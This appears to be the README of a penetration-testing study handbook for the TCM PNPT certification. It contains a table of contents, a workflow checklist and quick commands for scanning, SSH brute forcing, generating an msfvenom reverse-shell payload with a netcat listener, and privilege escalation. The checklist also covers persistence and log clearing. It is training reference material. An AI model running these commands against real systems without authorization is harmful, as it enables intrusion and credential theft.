# BETTER NOTES - TCM PNPT PENTESTING HANDBOOK

Quick reference guide for pentesting engagements. Commands marked with `$` are for command line execution.

## Table of Contents

### 📚 0-Foundation
- [**00-QUICK-START**](0-Foundation/00-QUICK-START.md) - 5 stages, workflow checklist, common ports
- [**01-NETWORKING**](0-Foundation/01-NETWORKING.md) - OSI model, TCP/UDP, IPv4/IPv6, subnetting
- [**20-TOOLS-RESOURCES**](0-Foundation/20-TOOLS-RESOURCES.md) - Tools by phase, useful links, common ports

### 🔍 1-Reconnaissance
- [**02-PASSIVE-RECON**](1-Reconnaissance/02-PASSIVE-RECON.md) - OSINT tools, company info, no active scanning
- [**03-EMAIL-CREDENTIALS**](1-Reconnaissance/03-EMAIL-CREDENTIALS.md) - Email discovery, breach databases, credential harvesting

### 📡 2-Scanning
- [**05-NMAP**](2-Scanning/05-NMAP.md) - Port scanning, service enumeration
- [**04-SUBDOMAIN-TECH**](2-Scanning/04-SUBDOMAIN-TECH.md) - Subdomain discovery, tech stack identification
- [**06-VULN-SCANNING**](2-Scanning/06-VULN-SCANNING.md) - Nessus, SearchSploit, CVE research
- [**07-HTTP-ENUMERATION**](2-Scanning/07-HTTP-ENUMERATION.md) - Web servers, directories, Nikto, Burp Suite
- [**08-SMB-ENUMERATION**](2-Scanning/08-SMB-ENUMERATION.md) - Windows shares, SMB version checking
- [**09-SSH-ENUMERATION**](2-Scanning/09-SSH-ENUMERATION.md) - SSH versions, weak algorithms, brute force
- [**10-DNS-OTHER-SERVICES**](2-Scanning/10-DNS-OTHER-SERVICES.md) - DNS, NFS, Telnet, hash identification

### ⚔️ 3-Exploitation
- [**11-BRUTE-FORCE**](3-Exploitation/11-BRUTE-FORCE.md) - Hydra, credential stuffing, password spraying
- [**12-METASPLOIT**](3-Exploitation/12-METASPLOIT.md) - MSFConsole basics, exploit workflow
- [**13-REVERSE-SHELLS**](3-Exploitation/13-REVERSE-SHELLS.md) - Shell types, MSFVenom, one-liners
- [**15-WEB-EXPLOITATION**](3-Exploitation/15-WEB-EXPLOITATION.md) - PHP shells, SQLi, LFI/RFI, file uploads
- [**16-ACTIVE-DIRECTORY**](3-Exploitation/16-ACTIVE-DIRECTORY.md) - LLMNR poisoning, Kerberoasting, PTH

### 🔐 4-Privesc
- [**14-PRIVESC**](4-Privesc/14-PRIVESC.md) - Linux/Windows privesc, SUID, sudo, UAC bypass

### 📤 5-PostExploitation
- [**17-POST-EXPLOITATION**](5-PostExploitation/17-POST-EXPLOITATION.md) - File transfer, data exfil, log cleanup
- [**18-FILE-CRACKING**](5-PostExploitation/18-FILE-CRACKING.md) - ZIP cracking, hash identification, John/Hashcat

### 📖 Reference
- [**19-BURP-SUITE**](Reference/19-BURP-SUITE.md) - Setup, intercepting, testing, scanning
- [**21-CHEATSHEET**](Reference/21-CHEATSHEET.md) - All commands in one place
- [**22-REPORTING-LEGAL**](Reference/22-REPORTING-LEGAL.md) - Documentation, scope, legal considerations

## Directory Structure

```
better-notes/
├── README.md
├── 0-Foundation/
│   ├── 00-QUICK-START.md
│   ├── 01-NETWORKING.md
│   └── 20-TOOLS-RESOURCES.md
├── 1-Reconnaissance/
│   ├── 02-PASSIVE-RECON.md
│   └── 03-EMAIL-CREDENTIALS.md
├── 2-Scanning/
│   ├── 04-SUBDOMAIN-TECH.md
│   ├── 05-NMAP.md
│   ├── 06-VULN-SCANNING.md
│   ├── 07-HTTP-ENUMERATION.md
│   ├── 08-SMB-ENUMERATION.md
│   ├── 09-SSH-ENUMERATION.md
│   └── 10-DNS-OTHER-SERVICES.md
├── 3-Exploitation/
│   ├── 11-BRUTE-FORCE.md
│   ├── 12-METASPLOIT.md
│   ├── 13-REVERSE-SHELLS.md
│   ├── 15-WEB-EXPLOITATION.md
│   └── 16-ACTIVE-DIRECTORY.md
├── 4-Privesc/
│   └── 14-PRIVESC.md
├── 5-PostExploitation/
│   ├── 17-POST-EXPLOITATION.md
│   └── 18-FILE-CRACKING.md
└── Reference/
    ├── 19-BURP-SUITE.md
    ├── 21-CHEATSHEET.md
    └── 22-REPORTING-LEGAL.md
```

---

**Discovery:**
```bash
$ arp-scan -l
$ netdiscover -r 192.168.1.0/24
$ nmap -T4 -p- 192.168.1.100
```

**Web:**
```bash
$ nikto -h http://192.168.1.100
$ ffuf -w wordlist.txt:FUZZ -u http://192.168.1.100/FUZZ
```

**Brute Force:**
```bash
$ hydra -l admin -P wordlist.txt ssh://192.168.1.100:22 -t 4 -V
```

**Shells:**
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
$ nc -nvlp 4444
```

**Privesc:**
```bash
$ sudo -l
$ ./linpeas.sh
```

---

## Common Vulnerabilities to Test For

- **SQL Injection** - User input in database queries
- **XSS** - Unescaped user input in web pages
- **CSRF** - State-changing requests without tokens
- **LFI/RFI** - File inclusion vulnerabilities
- **Weak Auth** - Default credentials, brute-forceable passwords
- **Misconfiguration** - Open shares, weak permissions, exposed backups
- **Outdated Software** - Known CVEs with public exploits
- **Privilege Escalation** - SUID binaries, sudo misconfig, DLL hijacking

---

## Workflow Checklist

- [ ] Gather scope & authorization documents
- [ ] Passive reconnaissance (emails, subdomains)
- [ ] Active scanning (Nmap, Nessus)
- [ ] Service enumeration (versions, tech stack)
- [ ] Vulnerability research (CVEs, exploits)
- [ ] Exploitation attempts
- [ ] Privilege escalation
- [ ] Post-exploitation (data extraction, persistence)
- [ ] Documentation & reporting
- [ ] Cleanup (remove backdoors, clear logs)

---

**Last Updated:** January 2026  
**Framework:** TCM PNPT  
**Purpose:** Portable reference for pentesting engagements

